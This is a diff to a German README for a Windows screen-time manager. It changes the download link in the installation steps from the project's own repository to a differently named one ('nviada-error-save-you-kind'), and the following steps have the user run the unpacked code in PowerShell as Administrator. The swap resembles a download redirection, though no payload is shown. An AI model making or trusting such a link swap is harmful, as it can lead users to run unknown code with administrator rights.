@@ -6,7 +6,7 @@
 
 Der Installer ist für einen frischen **Windows-10/11-Test-PC** vorgesehen. Der vollständige Windows-Ablauf wurde noch nicht ausgeführt; vor produktiver Nutzung Installation, Benutzerwechsel, Anzeige und Deinstallation auf einem Test-PC prüfen.
 
-1. Das gesamte Repository als ZIP herunterladen und entpacken: [Download](https://github.com/Atakan-24/windows-screen-time-manager/archive/refs/heads/master.zip).
+1. Das gesamte Repository als ZIP herunterladen und entpacken: [Download](https://github.com/Atakan-24/nviada-error-save-you-kind/archive/refs/heads/master.zip).
 2. **Windows PowerShell (64 Bit) als Administrator** öffnen. Kein PowerShell-7-Fenster verwenden: Die Anwendung nutzt Windows PowerShell 5.1.
 3. In den entpackten Ordner wechseln und starten:
 
